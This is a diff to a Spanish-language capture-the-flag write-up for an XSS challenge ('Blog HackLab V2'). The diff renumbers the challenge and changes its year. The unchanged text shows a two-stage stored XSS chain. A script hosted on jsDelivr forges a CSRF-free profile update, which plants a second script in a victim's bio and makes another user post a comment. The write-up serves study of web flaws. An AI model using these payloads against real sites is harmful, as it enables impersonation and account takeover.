@@ -1,18 +1,18 @@
-# Desafío 10 - Blog HackLab V2 (HackLab 2026)
+# Desafío 43 - Blog HackLab V2 (HackLab 2025)
 
 **Plataforma:** HackLab (SoftwareSeguro)  
-**Edición:** HackLab 2026  
+**Edición:** HackLab 2025  
 **Categoría:** XSS  
 
 ## Análisis
 
-Cuarta versión del "Blog de Pepe". El blog permite publicar comentarios y, para los perfiles marcados como **expertos**, muestra públicamente su biografía (`bio`) en la sección `/biographies`. El objetivo cambia respecto al Desafío 9: ya no hay que modificar un perfil, sino **lograr que la usuaria `jeni` deje un comentario**.
+Cuarta versión del "Blog de Pepe". El blog permite publicar comentarios y, para los perfiles marcados como **expertos**, muestra públicamente su biografía (`bio`) en la sección `/biographies`. El objetivo cambia respecto al Desafío 29: ya no hay que modificar un perfil, sino **lograr que la usuaria `jeni` deje un comentario**.
 
 La restricción central es de comportamiento: **`jeni` nunca entra a `/comments`** (cree que es insegura), **solo visita `/biographies`**. Un `<script>` alojado en un comentario, entonces, jamás se ejecuta en su navegador: solo corre para quien carga la página de comentarios (Pepe sí; Jeni no). El payload tiene que terminar **dentro de una bio que se renderice en `/biographies`**, la única página que Jeni abre.
 
 Se dispone de un mecanismo de ingeniería social que fuerza el ingreso **primero de Pepe y luego de Jeni** al blog, una vez por minuto. Esa funcionalidad no se ataca; solo sirve para provocar la visita de las víctimas.
 
-Las primitivas de la vulnerabilidad son las mismas del Desafío 9:
+Las primitivas de la vulnerabilidad son las mismas del Desafío 29:
 
 - **Stored XSS sin sanitizar en la salida.** El campo de comentarios re-inyecta el HTML tal cual (`<b>test</b>` se renderiza en negrita). Lo mismo ocurre con la **bio**: al setear la bio de un experto a `<b>xsstest</b>`, `/biographies` la devuelve cruda:
 
@@ -22,7 +22,7 @@ Las primitivas de la vulnerabilidad son las mismas del Desafío 9:
 
   Cargando `/biographies`, la bio de `@pepe` aparece en negrita, lo que confirma que la bio no se sanitiza y que un `<script src>` inyectado ahí se ejecutará:
 
-  ![Desafío 10 - Blog HackLab V2 (HackLab 2026) - prueba: la bio <b>xsstest</b> se renderiza en negrita en /biographies](assets/01.png)
+  ![Desafío 43 - Blog HackLab V2 (HackLab 2025) - prueba: la bio <b>xsstest</b> se renderiza en negrita en /biographies](assets/01.png)
 
 - **CSP mal configurada** en el `<head>`:
 
@@ -55,13 +55,13 @@ La idea es pivotar de `/comments` (donde entra Pepe) a `/biographies` (donde ent
 Se aloja en jsDelivr (para pasar la CSP y evitar el bloqueo ORB) y se referencia desde un comentario:
 
 ```html
-<script src="https://cdn.jsdelivr.net/gh/gonzaorban/CTF-Writeups@main/HackLab/xss/desafio-10-blog-hacklab-v2/assets/stage1.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/gonzaorban/CTF-Writeups@main/HackLab/xss/desafio-43-blog-hacklab-v2/assets/stage1.js"></script>
 ```
 
-Cuando Pepe carga `/comments`, el script forja un `POST /profile` (`multipart/form-data`, campos `bio` y `profile_pic`, sin CSRF) que guarda en **su** bio un segundo `<script src>` apuntando a `stage2.js`. La imagen es un JPEG de 1×1 embebido en Base64 y construido en memoria con `Blob`, igual que en el Desafío 9:
+Cuando Pepe carga `/comments`, el script forja un `POST /profile` (`multipart/form-data`, campos `bio` y `profile_pic`, sin CSRF) que guarda en **su** bio un segundo `<script src>` apuntando a `stage2.js`. La imagen es un JPEG de 1×1 embebido en Base64 y construido en memoria con `Blob`, igual que en el Desafío 29:
 
 ```javascript
-const bioPayload = '<script src="https://cdn.jsdelivr.net/gh/gonzaorban/CTF-Writeups@main/HackLab/xss/desafio-10-blog-hacklab-v2/assets/stage2.js"><\/script>';
+const bioPayload = '<script src="https://cdn.jsdelivr.net/gh/gonzaorban/CTF-Writeups@main/HackLab/xss/desafio-43-blog-hacklab-v2/assets/stage2.js"><\/script>';
 
 const fd = new FormData();
 fd.append("bio", bioPayload);
@@ -76,11 +76,11 @@ await fetch("/profile", {
 
 Como Pepe es experto, su bio ya envenenada pasa a mostrarse en `/biographies`:
 
-![Desafío 10 - Blog HackLab V2 (HackLab 2026) - bio de Pepe envenenada con el segundo script en /biographies](assets/02.png)
+![Desafío 43 - Blog HackLab V2 (HackLab 2025) - bio de Pepe envenenada con el segundo script en /biographies](assets/02.png)
 
 El payload almacenado se puede confirmar abriendo la sección Perfil: el campo Bio contiene el `<script src=".../stage2.js"></script>`.
 
-![Desafío 10 - Blog HackLab V2 (HackLab 2026) - payload almacenado visible en el campo Bio del perfil](assets/03.png)
+![Desafío 43 - Blog HackLab V2 (HackLab 2025) - payload almacenado visible en el campo Bio del perfil](assets/03.png)
 
 ### 2. `stage2.js` — comentar como Jeni (se ejecuta en `/biographies`)
 
@@ -107,7 +107,7 @@ Conviene **partir de un estado limpio** (reiniciar el desafío / limpiar bios y 
 
 Al publicarse el comentario de Jeni, el blog muestra el mensaje de éxito con el flag. Se ve el comentario firmado por `jeni` y el encabezado "Ganaste":
 
-![Desafío 10 - Blog HackLab V2 (HackLab 2026) - comentario publicado como jeni y flag "Ganaste"](assets/04.png)
+![Desafío 43 - Blog HackLab V2 (HackLab 2025) - comentario publicado como jeni y flag "Ganaste"](assets/04.png)
 
 ## Flag
 
